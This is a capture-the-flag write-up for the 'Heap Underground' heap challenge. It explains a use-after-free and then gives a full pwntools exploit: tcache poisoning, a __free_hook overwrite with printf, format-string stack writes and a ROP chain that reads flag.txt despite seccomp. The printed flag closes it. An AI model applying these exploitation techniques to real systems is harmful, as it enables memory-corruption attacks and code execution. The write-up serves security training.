# Heap Underground

## Challenge

The program allows us to:

- allocate chunks, up to a size of 0x400
- free chunks, which also prints the contents of the chunk before freeing
- edit the first byte of a chunk, one time only

```
1) Allocate
2) Free
3) Edit
4) Exit
Choice: 
```

The program uses seccomp filters to limit the allowed syscalls.

## Solution

Freeing a chunk requires that the chunk is in use.
However, editing does not, resulting in a use-after-free vulnerability.

For some reason, when allocating a chunk, the metadata appears to be cleared.
Leaking addresses is not as simple as creating a chunk, freeing it, then recreating it without overwriting a pointer and freeing it again.

Instead, we need to create chunks which overlap with previously freed and consolidated chunks.
This will allow us to read metadata from chunks at higher addresses.
Unsorted bin chunks will automatically consolidate when freed, so overlapping these is simple.
Fast bin chunks can be moved to the unsorted bin by making a large allocation, 0x400 will suffice.

The fast bin leak gives us the XOR key to use when faking fast bin metadata.
The unsorted bin leak gives us the libc address.

We create a loop in the tcache by poisoning an entry using the single byte edit.
This allows an earlier allocation to change the metadata which will be used by a later allocation.
We can use this to poison the tcache again to allocate a chunk at `__free_hook` and overwrite it.

We cannot simply call `system` due to seccomp filters.
Instead, we can use a function which will allow us to transition to a ROP chain.
One option is `gets`, which can be used to write nearly arbitrary data to the heap and poison other tcaches.
Another option is `printf`, which can be used for more leaks and can be developed into an arbitrary read/write through control over the format string.
The following exploit uses `printf`.

We have a very limited base pointer chain, so instead we use the pointer chain to the program path string.
Using the first pointer, we edit a second pointer to point anywhere on the stack.
Using the second pointer, we can write arbitrary values on the stack, including addresses for arbitrary read/write or ROP chain gadgets.

Here, we write a ROP chain onto the stack, then overwrite the return address to activate it when ready.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 heap_underground
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'heap_underground')
libc = ELF('./glibc/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

io = start()

def alloc(size, data):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', str(size).encode())
    io.sendafter(b': ', data)

def free(i):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', str(i).encode())
    io.recvuntil(b'Data: ')
    return io.recvuntil(b'\n1)', drop=True)

def edit(i, data):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b': ', str(i).encode())
    io.sendafter(b': ', data)

for i in range(0, 9):
    alloc(0x18, b'\n')

# tcache
for i in range(0, 7):
    free(i)

# unsorted
free(8)
free(7)

alloc(0x400, flat({0x18: b'NEEDLE :'}))
leak = free(0)
leak = leak.split(b'NEEDLE :', 1)[1]
leak = unpack(leak, 'all')

heap_key = leak
print('heap key: ' + hex(heap_key))

for i in range(0, 9):
    alloc(0x88, b'\n')

alloc(0x88, b'guard\n')

# tcache
for i in range(0, 7):
    free(i)

# unsorted
free(8)
free(7)

alloc(0x118, flat({0x88: b'NEEDLE :x'}))

leak = free(0)
leak = leak.split(b'NEEDLE :', 1)[1]
leak = unpack(leak, 'all')
leak = leak & 0xffffffffffffff00

libc.address = leak - 0x1e3c00
print('libc: ' + hex(libc.address))

for i in range(0, 2):
    alloc(0x18, b'\n')

for i in range(0, 2):
    free(i)

edit(0, p8((0x60 ^ heap_key) & 0xff))

alloc(0x18, pack(heap_key))

alloc(0x18, pack(libc.sym['__free_hook'] ^ heap_key))

alloc(0x18, pack(heap_key))

alloc(0x18, pack(libc.sym['printf']))

alloc(0x400, b'LIBC:%8$p: EXE:%16$p: NEEDLE:\n\0')

leak = free(4)
leak = leak.split(b'NEEDLE:\n\n', 1)[1]

leak = leak.split(b'LIBC:', 1)[1]
(leak, remaining) = leak.split(b':', 1)
leak = int(leak, 0)
stack = leak
print('stack: ' + hex(stack))

leak = remaining
leak = leak.split(b'EXE:', 1)[1]
(leak, remaining) = leak.split(b':', 1)
leak = int(leak, 0)
exe.address = leak - exe.sym['main']
print('exe: ' + hex(exe.address))

def stack_write(addr, b):
    alloc(0x80, b'%' + str(addr & 0xffff).encode() + b'c' + b'%14$hn\n')
    free(4)
    if b == 0:
        alloc(0x80, b'%43$hhn\n')
    else:
        alloc(0x80, b'%' + str((b) & 0xff).encode() + b'c' + b'%43$hhn\n')
    free(4)

buf = stack + 0x200

rop = ROP(libc)
rop.rax = 2
rop.rdi = buf
rop.rsi = 0
rop.raw(rop.find_gadget(['syscall', 'ret']).address)
rop.read(3, buf, 0x100)
rop.write(1, buf, 0x100)

print(rop.dump())

a = stack + 0x18
n = 0
for b in rop.chain():
    stack_write(a, b)
    n += 1
    print(n)
    a += 1

a = buf
n = 0
for b in b'flag.txt\0':
    stack_write(a, b)
    n += 1
    print(n)
    a += 1

alloc(0x80, b'%' + str(stack - 0x18 & 0xffff).encode() + b'c' + b'%14$hn\n')
free(4)
alloc(0x80, b'%' + str((exe.address + 0x124b) & 0xffff).encode() + b'c' + b'%43$hn\n')

io.sendlineafter(b': ', b'2')
io.sendlineafter(b': ', b'4')

io.interactive()
```

## Flag

```
HTB{k1d5_g0_t0_th3_pl4ygr0und_u_g0_und3rgr0und}
```